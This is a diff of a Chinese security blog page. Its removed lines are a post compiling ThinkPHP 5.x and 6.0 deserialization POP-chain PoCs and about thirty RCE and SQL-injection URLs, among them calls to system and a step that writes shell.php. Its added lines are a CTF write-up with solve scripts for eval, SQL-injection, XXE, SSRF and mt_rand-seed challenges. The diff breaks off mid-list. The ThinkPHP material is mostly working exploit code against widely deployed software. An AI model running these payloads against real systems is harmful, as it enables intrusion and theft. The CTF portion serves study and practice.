@@ -4,7 +4,7 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="thinkphp合集, Fortheone">
+    <meta name="keywords" content="刷题记录0319, Fortheone">
     <meta name="description" content>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>thinkphp合集 | Fortheone</title>
+    <title>刷题记录0319 | Fortheone</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -281,12 +281,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">thinkphp合集</h1>
+                    <h1 class="description center-align post-title">刷题记录0319</h1>
                 </div>
             </div>
         </div>
@@ -411,8 +411,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/总结记录/" class="post-category">
-                                总结记录
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
                             </a>
                         
                     </div>
@@ -424,7 +424,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-12-12
+                    2020-03-29
                 </div>
                 
 
@@ -433,14 +433,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.5k
+                    1.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    8 分
+                    7 分
                 </div>
                 
 
@@ -456,291 +456,557 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="0x00-thinkphp5-1-x-反序列化漏洞">0x00 thinkphp5.1.x 反序列化漏洞</h3>
-<p>利用链：</p>
-<pre><code>\thinkphp\library\think\process\pipes\Windows.php - &gt; __destruct()
-
-\thinkphp\library\think\process\pipes\Windows.php - &gt; removeFiles()
-
-Windows.php: file_exists()
-
-thinkphp\library\think\model\concern\Conversion.php - &gt; __toString()
-
-thinkphp\library\think\model\concern\Conversion.php - &gt; toJson() 
-
-thinkphp\library\think\model\concern\Conversion.php - &gt; toArray()
-
-thinkphp\library\think\Request.php   - &gt; __call()
-
-thinkphp\library\think\Request.php   - &gt; isAjax()
-
-thinkphp\library\think\Request.php - &gt; param()
-
-thinkphp\library\think\Request.php - &gt; input()
-
-thinkphp\library\think\Request.php - &gt; filterValue()
-</code></pre>
-<p>thinkphp5.1.x中利用的是__call方法实现rce，比较巧妙的点是使用了filtervalue来执行回调函数，过程不是特别复杂，但是也理了很久才理清楚。</p>
-<p>poc：</p>
+                <h4 id="易博霖比赛-web1">易博霖比赛 web1</h4>
+<p>这比赛几乎都是原题改的，难度低，web分数不吃香，最后只拿了第七。</p>
+<p>web1和code-breaking的原题差不多，加了个过滤，不过用session可以直接rce</p>
 <pre><code>&lt;?php
-namespace think;
-abstract class Model{
-    protected $append = [];
-    private $data = [];
-    function __construct(){
-        $this-&gt;append = [&quot;lin&quot;=&gt;[&quot;calc.exe&quot;,&quot;calc&quot;]];
-        $this-&gt;data = [&quot;lin&quot;=&gt;new Request()];
-    }
+if(isset($_GET['var'])){
+        if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['var'])) {
+                if (!preg_match('/et|dir|na|info|dec|oct|pi|log/i', $_GET['var'])) {
+                    eval($_GET['var']);
+                }
+        }else{
+            die(&quot;Sorry!&quot;);
+        }
 }
-class Request
-{
-    protected $hook = [];
-    protected $filter = &quot;system&quot;;
-    protected $config = [
-        // 表单ajax伪装变量
-        'var_ajax'         =&gt; '_ajax',  
-    ];
-    function __construct(){
-        $this-&gt;filter = &quot;system&quot;;
-        $this-&gt;config = [&quot;var_ajax&quot;=&gt;'lin'];
-        $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]];
-    }
+else{
+    show_source(__FILE__);
 }
-
-
-namespace think\process\pipes;
-
-use think\model\concern\Conversion;
-use think\model\Pivot;
-class Windows
-{
-    private $files = [];
-
-    public function __construct()
-    {
-        $this-&gt;files=[new Pivot()];
-    }
-}
-namespace think\model;
-
-use think\Model;
-
-class Pivot extends Model
-{
-}
-use think\process\pipes\Windows;
-echo base64_encode(serialize(new Windows()));
 ?&gt;
 </code></pre>
-<p>利用条件：</p>
-<ol>
-<li>未经过滤直接使用反序列化操作</li>
-<li>可以文件上传且文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤</li>
-</ol>
-<p>满足任意一个即可</p>
-<h3 id="0x01-thinkphp5-2-x-反序列化漏洞">0x01 thinkphp5.2.x 反序列化漏洞</h3>
-<p>thinkphp5.2与5.1不同的是利用链中的request类的 __call方法被删除掉了，但在原有的这条链上的后半条链上有了新的用法，可以通杀5.1和5.2 。</p>
-<p>利用链：</p>
-<pre><code>think\process\pipes\Windows-&gt;__destruct()
- think\process\pipes\Windows-&gt;removeFiles()
- think\model\concern\Conversion-&gt;__toString()
- think\model\concern\Conversion-&gt;toJson()
- think\model\concern\Conversion-&gt;toArray()
- think\model\concern\Attribute-&gt;getAttr()
- think\model\concern\Attribute-&gt;getValue()
+<p>利用脚本</p>
+<pre class=" language-language-python"><code class="language-language-python">import requests 
+url= "http://124.193.74.212:32625/?var=eval(hex2bin(session_id(session_start())));"
+payload="var_dump(file_get_contents('/flag.txt'));".encode('hex')
+cookies={'PHPSESSID':payload}
+res = requests.get(url,cookies=cookies)
+print res.text
 </code></pre>
-<p>在最后getValue处有一个</p>
-<pre><code>$closure = $this-&gt;withAttr[$fieldName]; 
-$value   = $closure($value, $this-&gt;data);
+<h4 id="web2">web2</h4>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/20200328160653.png" alt></p>
+<p>File 参数后门跟着一串base64编码两次的字符串 对其解码为</p>
+<p>ctfimage.jpg</p>
+<p>判断存在文件包含漏洞 构造index.php 编码两次传入得到源码</p>
+<pre class=" language-language-php"><code class="language-language-php"><?php
+error_reporting(E_ALL || ~E_NOTICE);
+
+header('content-type:text/html;charset=utf-8');
+if(! isset($_GET['file']))
+    header('Refresh:0;url=./index.php?file=WTNSbWFXMWhaMlV1YW5Cbg==');
+$file = base64_decode(base64_decode($_GET['file']));
+echo '<title>'.$_GET['file'].'';
+$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
+echo 'input_filename:   '. $file.'<br>';
+$file = str_replace("ctf","flag", $file);
+echo 'real_filename:   '.$file.'<br>';
+$txt = base64_encode(file_get_contents($file));
+ 
+echo "<img src="data:image/gif;base64," .$txt."">";
+/*
+ * Can you find the flag file?
+ *
+ * Hint: hal0flagi5here.php
+ */
+ 
 </code></pre>
-<p>这里 $closure和$value都可控，可以构造成system(“ls”,$this-&gt;data)的形式来执行命令，第二个参数$this-&gt;data不用管。</p>
-<p>poc:</p>
-<pre><code>&lt;?php
-namespace think\process\pipes {
-    class Windows
-    {
-        private $files;
-        public function __construct($files)
-        {
-            $this-&gt;files = [$files];
+<p>里面写的ctf换flag参数根本没用上，不知道出题人的意思是啥，读hint下的文件</p>
+<pre class=" language-language-php"><code class="language-language-php"><?php
+$argv[1]=$_GET['url'];
+if(filter_var($argv[1],FILTER_VALIDATE_URL))
+{
+	$r = parse_url($argv[1]);
+	print_r($r);
+	if(preg_match('/happyctf\.com$/',$r['host']))
+	{
+		$url=file_get_contents($argv[1]);
+		echo($url);
+	}else
+	{
+		echo("error");
+	}
+
+}else
+{
+	echo "403 Forbidden";
+}
+?>
+</code></pre>
+<p>百度了只找到绕过过滤打xss的方法，但是读文件怎么读不知道。</p>
+<p>传了个 data://@happyctf.com/…/…/…/…/flag.txt  还是读不到</p>
+<p>学弟发了个  dict://@happyctf.com/…/…/…/…/flag.txt   这样就读到了 不知道为什么</p>
+<p>后面看Y1ng师傅博客上写的好像说 只有传的协议是file_get_contents不可解析的就行</p>
+<h4 id="web3">web3</h4>
+<p>这是RCTF2015 ezsql的原题改的，前几天刷buu的时候刚好做到了，二次注入的题。只要在登录的时候注册用户名带上&quot; 在进入修改密码的时候点击修改就会在页面产生报错。</p>
+<p>直接拿网上的脚本改了下</p>
+<pre class=" language-language-python"><code class="language-language-python">import requests
+
+url_reg = 'http://124.193.74.212:58971/register.php'
+url_log = 'http://124.193.74.212:58971/login.php'
+url_change = 'http://124.193.74.212:58971/changepwd.php'
+
+pre = 'peri0d"'
+suf = "'))),1))#"
+
+s = 'abcdefghijklmnopqrstuvwxyz1234567890'
+s = list(s)
+
+r = requests.session()
+
+def register(name):
+    data = {
+        'username' : name,
+        'password' : '123',
+        'email' : '123',
+    }
+    r.post(url=url_reg, data=data)
+
+def login(name):
+    data = {
+        'username' : name,
+        'password' : '123',
+    }
+    r.post(url=url_log, data=data)
+    
+def changepwd():
+    data = {
+        'oldpass' : '',
+        'newpass' : '',
+    }
+    kk = r.post(url=url_change, data=data)
+    if 'target' not in kk.text:
+        print(kk.text)
+
+for i in s:
+    paylaod = pre + "||(updatexml(1,concat((select(group_concat(flag))from(flag)where(flag)regexp('" + i + suf
+    register(paylaod)
+    login(paylaod)
+    changepwd()
+</code></pre>
+<p>这里的flag很短，可以直接读到，不需要regexp。</p>
+<h4 id="web4">web4</h4>
+<p>本以为是上传docx xxe盲打，但是发现会直接回显上传docx中core.xml中的title，并且给了源码，upload.php.bak</p>
+<pre class=" language-language-php"><code class="language-language-php"><?php
+if(isset($_POST["submit"])) {
+    $target_file = getcwd()."/upload/".md5($_FILES["file"]["tmp_name"]);
+    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
+        try {
+            $result = @file_get_contents("zip://".$target_file."#docProps/core.xml");
+            $xml = new SimpleXMLElement($result, LIBXML_NOENT);
+            $xml->registerXPathNamespace("dc", "http://purl.org/dc/elements/1.1/");
+            foreach($xml->xpath('//dc:title') as $title){
+                echo "Title '".$title . "' has been added.<br>";
+            }
+        } catch (Exception $e){
+            echo $e;
+            echo "上传文件不是一个docx文档.";
+        }
+    } else {
+        echo "上传失败.";
+    }
+}
+</code></pre>
+<p>根据代码在下载的docx文档中修改core.xml文件中的 title，改成这样</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/20200328161630.png" alt></p>
+<p>然后上传访问就行了。</p>
+<h3 id="天璇新生赛">天璇新生赛</h3>
+<p>密码学后面的不会 前面的太简单 就不记录了</p>
+<h4 id="web-ezpop">web ezpop</h4>
+<pre class=" language-language-php"><code class="language-language-php">Welcome to index.php
+<?php
+//flag is in flag.php
+//WTF IS THIS?
+//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
+//And Crack It!
+class Modifier {
+    protected  $var;
+    public function append($value){
+        include($value);
+    }
+    public function __invoke(){
+        $this->append($this->var);
+    }
+}
+
+class Show{
+    public $source;
+    public $str;
+    public function __construct($file='index.php'){
+        $this->source = $file;
+        echo 'Welcome to '.$this->source."<br>";
+    }
+    public function __toString(){
+        return $this->str->source;
+    }
+
+    public function __wakeup(){
+        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
+            echo "hacker";
+            $this->source = "index.php";
         }
     }
 }
 
-namespace think\model\concern {
-    trait Conversion
-    {    
+class Test{
+    public $p;
+    public function __construct(){
+        $this->p = array();
     }
 
-    trait Attribute
-    {
-        private $data;
-        private $withAttr = [&quot;lin&quot; =&gt; &quot;system&quot;];
+    public function __get($key){
+        $function = $this->p;
+        return $function();
+    }
+}
 
-        public function get()
-        {
-            $this-&gt;data = [&quot;lin&quot; =&gt; &quot;dir&quot;];
+if(isset($_GET['pop'])){
+    @unserialize($_GET['pop']);
+}
+else{
+    $a=new Show;
+    highlight_file(__FILE__);
+}
+</code></pre>
+<p>这个序列化pop链很简单，当时构造出来怎么都跑不出来，后来发现是因为忘了urlencode一次，导致protected属性没被带进去。。。</p>
+<p>脚本</p>
+<pre class=" language-language-php"><code class="language-language-php"><?php
+class Modifier {
+    protected  $var;
+    public function __construct(){
+    	$this->var = "php://filter/read=convert.base64-encode/resource=flag.php";
+    }
+}
+
+class Show{
+    public $source;
+    public $str;
+}
+
+class Test{
+    public $p;
+}
+
+
+$a = new Show();
+$a->source = new Show();
+$a->source->str=new Test();
+$a->source->str->p=new Modifier();
+
+echo(urlencode(serialize($a)));
+</code></pre>
+<h4 id="web-PYwebsite">web PYwebsite</h4>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/20200328162416.png" alt></p>
+<p>在前端写了逻辑判断传入的code和这个值是否一样，想着js好像是弱类型，但是构造了半天都不行，后来百度说js是动态类型，并不存在像php的弱类型漏洞。</p>
+<p>想着直接跳转到flag.php ，那就访问flag.php看看</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/20200328162607.png" alt></p>
+<p>这里肯定是不能直接访问的，那么就想是如何判断是否为授权用户的呢。刚好前几天在写前端，想到前端跳后端一般是完成逻辑----&gt;赋值session-----&gt;后端判断是否有session，但是这里看到前端传入的code并没有跳到任何php文件中进行判断（唯一跳进的php文件还被删除了），是直接由前端判断而后转入flag.php。 那么很可能判断的条件是 refer（访问该页面的上一个页面），尝试无果后。</p>
+<p>学弟扔了个 xff构造成功。。。</p>
+<h4 id="web-ezbypass">web ezbypass</h4>
+<pre class=" language-language-php"><code class="language-language-php">
+I put something in F12 for you
+include 'flag.php';
+$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
+if(isset($_GET['gg'])&&isset($_GET['id'])) {
+    $id=$_GET['id'];
+    $gg=$_GET['gg'];
+    if (md5($id) === md5($gg) && $id !== $gg) {
+        echo 'You got the first step';
+        if(isset($_POST['passwd'])) {
+            $passwd=$_POST['passwd'];
+            if (!is_numeric($passwd))
+            {
+                 if($passwd==1234567)
+                 {
+                     echo 'Good Job!';
+                     highlight_file('flag.php');
+                     die('By Retr_0');
+                 }
+                 else
+                 {
+                     echo "can you think twice??";
+                 }
+            }
+            else{
+                echo 'You can not get it !';
+            }
+
+        }
+        else{
+            die('only one way to get the flag');
+        }
+}
+    else {
+        echo "You are not a real hacker!";
+    }
+}
+else{
+    die('Please input first');
+}
+}Please input first
+</code></pre>
+<p>第一个条件是md5强判断，三个等于号。不能用数组绕过，所以想到之前强网杯的解法，构造两个相似的文件，碰撞出相同的md5值。<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">链接</a></p>
+<p>第二个条件就是构造 1234567a就行</p>
+<h4 id="web-文件上传">web 文件上传</h4>
+<p>没什么好说的 传个.htaccess解析jpg就行了</p>
+<h4 id="web-套娃">web 套娃</h4>
+<pre class=" language-language-php"><code class="language-language-php"><!--
+//1st
+$query = $_SERVER['QUERY_STRING'];
+
+ if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
+    die('Y0u are So cutE!');
+}
+ if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
+    echo "you are going to the next ~";
+}
+!-->
+</code></pre>
+<p>第一个判断用.就可以绕过，在php中 .会被替换成下划线。</p>
+<p>第二个判断加个%0a就可以。</p>
+<p>得到一个secrettw.php jsfuck提示传入 Merak参数得到源码</p>
+<pre class=" language-language-php"><code class="language-language-php">Flag is here~But how to get it? <?php 
+error_reporting(0); 
+include 'takeip.php';
+ini_set('open_basedir','.'); 
+include 'flag.php';
+
+if(isset($_POST['Merak'])){ 
+    highlight_file(__FILE__); 
+    die(); 
+} 
+
+
+function change($v){ 
+    $v = base64_decode($v); 
+    $re = ''; 
+    for($i=0;$i<strlen($v);$i++){ 
+        $re .= chr ( ord ($v[$i]) + $i*2 ); 
+    } 
+    return $re; 
+}
+echo 'Local access only!'."<br/>";
+$ip = getIp();
+if($ip!='127.0.0.1')
+echo "Sorry,you don't have permission!  Your ip is :".$ip;
+if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
+echo "Your REQUEST is:".change($_GET['file']);
+echo file_get_contents(change($_GET['file'])); }
+?> 
+</code></pre>
+<p>第一个ip用client-ip就可以过</p>
+<p>第二个判断条件 传入的参数会经过一个change函数来替换，写一个逆推出可得到flag的字符串</p>
+<pre class=" language-language-php"><code class="language-language-php">function decry(){
+	$v = 'flag.php';
+	$re = '';
+	for($i=0;$i<strlen($v);$i++){ $re .="chr(ord($v[$i])" - $i*2); } echo($re); < code></strlen($v);$i++){></code></pre>
+<p>然后base64编码一下传过去就行</p>
+<h4 id="web-audit">web audit</h4>
+<p>扫描到一个www.zip，其中index.php代码如下</p>
+<pre class=" language-language-php"><code class="language-language-php"><?php 
+header('Content-type:text/html; charset=utf-8');
+error_reporting(0);
+if(isset($_POST['login'])){
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+    $Private_key = $_POST['Private_key'];
+    if (($username == '') || ($password == '') ||($Private_key == '')) {
+        // 若为空,视为未填写,提示错误,并3秒后返回登录界面
+        header('refresh:2; url=login.html');
+        echo "用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!";
+        exit;
+}
+    else if($Private_key != '*************' )
+    {
+        header('refresh:2; url=login.html');
+        echo "假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!";
+        exit;
+    }
+
+    else{
+        if($Private_key === '************'){
+        $getuser = "SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'".';'; 
+        $link=mysql_connect("localhost","root","root");
+        mysql_select_db("test",$link);
+        $result = mysql_query($getuser);
+        while($row=mysql_fetch_assoc($result)){
+            echo "<tr><td>".$row["username"]."</td><td>".$row["flag"]."</td><td>";
         }
     }
-}
-
-namespace think {
-    abstract class Model
-    {
-        use model\concern\Attribute;
-        use model\concern\Conversion;
     }
-}
 
-namespace think\model{
-    use think\Model;
-    class Pivot extends Model
-    {
-        public function __construct()
-        {
-            $this-&gt;get();
-        }
-    }
-}
+} 
+// genarate public_key 
+function public_key($length = 16) {
+    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    $public_key = '';
+    for ( $i = 0; $i < $length; $i++ )
+    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
+    return $public_key;
+  }
 
-namespace {
+  //genarate private_key
+  function private_key($length = 12) {
+    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    $private_key = '';
+    for ( $i = 0; $i < $length; $i++ )
+    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
+    return $private_key;
+  }
+  $Public_key = public_key();
+  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???
+</td></code></pre>
+<p>题目要求我们传入私钥和服务器计算出的私钥相同，就是mt_rand的种子可猜解问题，因为得知计算出的公钥，可以猜解种子。</p>
+<p>脚本：</p>
+<pre class=" language-language-python"><code class="language-language-python">str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+str2 = 'KVQP0LdJKRaV3n9D'
+str3 = str1[::-1]
+length = len(str2)
+res = ''
+for i in range(len(str2)):
+    for j in range(len(str1)):
+        if str2[i] == str1[j]:
+            res += str(j) + ' ' + str(j) + ' ' + '0' + ' ' + str(len(str1) - 1) + ' '
+            break
 
-    $conver = new think\model\Pivot();
-    $payload = new think\process\pipes\Windows($conver);
-    echo urlencode(serialize($payload));
-}
-?&gt;
+print(res)
 </code></pre>
-<h3 id="0x02-thinkphp-6-0-反序列化漏洞">0x02 thinkphp 6.0 反序列化漏洞</h3>
-<p>thinkphp6.0的变化在于起始点换成了Model类，但后半条链和5.2还是一样的构造方法。</p>
-<pre><code>&lt;?php
-namespace think\model\concern;
-trait Conversion
-{
+<p>得到一串php_mt_seed可识别的字符串，用php_mt_seed爆破种子得到1775196155</p>
+<pre class=" language-language-php"><code class="language-language-php"><?php
+mt_srand(1775196155);
+
+function public_key($length = 16) {
+    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    $public_key = '';
+    for ( $i = 0; $i < $length; $i++ )
+    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
+    return $public_key;
+  }
+
+function private_key($length = 12) {
+    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    $private_key = '';
+    for ( $i = 0; $i < $length; $i++ )
+    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
+    echo $private_key;
 }
 
-trait Attribute
-{
-    private $data;
-    private $withAttr = [&quot;axin&quot; =&gt; &quot;system&quot;];
-
-    public function get()
-    {
-        $this-&gt;data = [&quot;axin&quot; =&gt; &quot;dir&quot;];  //你想要执行的命令，这里的键值只需要保持和withAttr里的键值一致即可
-    }
+public_key();
+private_key();
+</code></code></pre>
+<p>一定要先跑一次公钥再算私钥，因为服务器先算了公钥再算的私钥，如果只算私钥，mt_rand顺序就会错。然后提交私钥，并且构造password= 1’ or ‘1’='1 得到flag。</p>
+<h4 id="web-Ezpop-Revenge">web Ezpop_Revenge</h4>
+<p>题目可下载www.zip直接得到一整套源码（我透</p>
+<p>开局一个flag.php</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/20200329233234.png" alt></p>
+<p>意思就是要打个ssrf，然后flag会存到session里，一开始在想是不是先打ssrf再读session文件，后来发现session会在下面这个文件里打印出来</p>
+<p>既然题目提示了反序列化，那先找个反序列化触发点 全局搜索 unserialize</p>
+<p>在usr/plugins/HelloWorld/Plugin.php 下找到 这里会打印session</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/20200329231034.png" alt></p>
+<p>找到这里应该是出题人设置的反序列化触发点，但是这里不可直接访问，要找一个调用此函数的地方，全局搜索 action（第一遍看没找到</p>
+<p>经师傅提示找 HelloWorld_Plugin类 在 var/Typecho/Plugin.php 找到定义了一条路由</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/20200329231330.png" alt></p>
+<p>所以我们可以通过 index.php/page_admin来访问action方法。</p>
+<p>接下来就是找  destruct  wakeup （一开始找的destruct链子不知道为什么一直被waf拦，后面换了一条）</p>
+<p>刚好就在action方法的文件里</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/20200329231827.png" alt></p>
+<p>实例化了一个Typecho_Db 的类 跟进这个类的construct方法（因为参数可控</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/20200329232154.png" alt></p>
+<p>拼接了参数$adapterName，而这个参数我们可控，所以可以触发一个tostring，再全局搜索tostring网上的那条tostring最后触发call_user_funct的链子 我过不了waf。。所以经过师傅提醒换了条链子</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/QQ%E5%9B%BE%E7%89%8720200329233107.png" alt></p>
+<p>这里的_sqlPreBuild 和 _adapter属性都可控，那么就可以打出__call方法，想到要打ssrf，就是SoapClient类了。</p>
+<p>构造poc</p>
+<pre class=" language-language-php"><code class="language-language-php"><?php
+class Typecho_Db_Query{
+	private $_adapter;
+	private $_sqlPreBuild;
+	public function __construct(){
+		$this->_adapter = new SoapClient(null,array('location' => "http://127.0.0.1/flag.php",
+                               'user_agent' => "AAA:BBB\r\n" .
+                                             "Cookie:PHPSESSID=uiklqref225rf3h3dv01dcnmh3",
+                               'uri' => "http://127.0.0.1/"));
+		$this->_sqlPreBuild['action']='SELECT';
+	}
+}
+class HelloWorld_DB{
+	private $coincidence;
+	public function __construct(){
+		$this->coincidence=array(
+			"hello" => new Typecho_Db_Query(),
+			"world" => "typecho_"
+		);
+	}
 }
 
-namespace think;
-abstract class Model{
-    use model\concern\Attribute;
-    use model\concern\Conversion;
-    private $lazySave = false;
-    protected $withEvent = false;
-    private $exists = true;
-    private $force = true;
-    protected $field = [];
-    protected $schema = [];
-    protected $connection='mysql';
-    protected $name;
-    protected $suffix = '';
-    function __construct(){
-        $this-&gt;get();
-        $this-&gt;lazySave = true;
-        $this-&gt;withEvent = false;
-        $this-&gt;exists = true;
-        $this-&gt;force = true;
-        $this-&gt;field = [];
-        $this-&gt;schema = [];
-        $this-&gt;connection = 'mysql';
-    }
-
-}
-
-namespace think\model;
-
-use think\Model;
-
-class Pivot extends Model
-{
-    function __construct($obj='')
-    {
-        parent::__construct();
-        $this-&gt;name = $obj;
-    }
-}
-$a = new Pivot();
-$b = new Pivot($a);
-
-echo urlencode(serialize($b));
-?&gt;
+$a=new HelloWorld_DB();
+echo base64_encode(serialize($a));
 </code></pre>
-<h3 id="0x03-thinkphp常见的RCE漏洞">0x03 thinkphp常见的RCE漏洞</h3>
-<pre><code>thinkphp-RCE-POC
-官方公告:
-1、https://blog.thinkphp.cn/869075
-2、https://blog.thinkphp.cn/910675
+<p>先将序列化数据传过去，再设置cookie访问page_admin得到flag。（原理就和 bestphp_revenge一样</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/QQ%E6%88%AA%E5%9B%BE20200329234057.png" alt></p>
+<h4 id="misc-pyflag">misc pyflag</h4>
+<p>得到的三个图片结尾的部分拼成一个新的zip文件，爆破一下密码1234</p>
+<p>得到一串密文 和hint 提示base加密</p>
+<p>根据提示 依次进行 base85  hexdecode base32 base16 base64得到flag</p>
+<h4 id="misc-千层套路">misc 千层套路</h4>
+<p>前面就是不断根据文件名作为密码解压zip文件，可能是以为用python解压比较慢，跑了蛮久才跑出来</p>
+<pre class=" language-language-python"><code class="language-language-python">import os
+import zipfile
+import time
 
-POC：
-
-thinkphp 5.0.22
-1、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&amp;name=database.username
-2、http://192.168.1.1/thinkphp/public/?s=.|think\config/get&amp;name=database.password
-3、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
-4、http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
-
-thinkphp 5
-5、http://127.0.0.1/tp5/public/?s=index/\think\View/display&amp;content=%22%3C?%3E%3C?php%20phpinfo();?%3E&amp;data=1
-
-thinkphp 5.0.21
-6、http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
-7、http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
-
-thinkphp 5.1.*
-8、http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1
-9、http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=system&amp;data=cmd
-10、http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E
-11、http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E
-12、http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
-13、http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd
-14、http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
-15、http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd
-
-未知版本
-16、?s=index/\think\module/action/param1/${@phpinfo()}
-17、?s=index/\think\Module/Action/Param/${@phpinfo()}
-18、?s=index/\think/module/aciton/param1/${@print(THINK_VERSION)}
-19、index.php?s=/home/article/view_recent/name/1'
-header = &quot;X-Forwarded-For:1') and extractvalue(1, concat(0x5c,(select md5(233))))#&quot;
-20、index.php?s=/home/shopcart/getPricetotal/tag/1%27
-21、index.php?s=/home/shopcart/getpriceNum/id/1%27
-22、index.php?s=/home/user/cut/id/1%27
-23、index.php?s=/home/service/index/id/1%27
-24、index.php?s=/home/pay/chongzhi/orderid/1%27
-25、index.php?s=/home/pay/index/orderid/1%27
-26、index.php?s=/home/order/complete/id/1%27
-27、index.php?s=/home/order/complete/id/1%27
-28、index.php?s=/home/order/detail/id/1%27
-29、index.php?s=/home/order/cancel/id/1%27
-30、index.php?s=/home/pay/index/orderid/1%27)%20UNION%20ALL%20SELECT%20md5(233)--+
-31、POST /index.php?s=/home/user/checkcode/ HTTP/1.1
-Content-Disposition: form-data; name=&quot;couponid&quot;
-1') union select sleep('''+str(sleep_time)+''')#
-
-thinkphp 5.0.23（完整版）debug模式
-32、(post)public/index.php (data)_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=touch%20/tmp/xxx
-
-thinkphp 5.0.23(完整版)
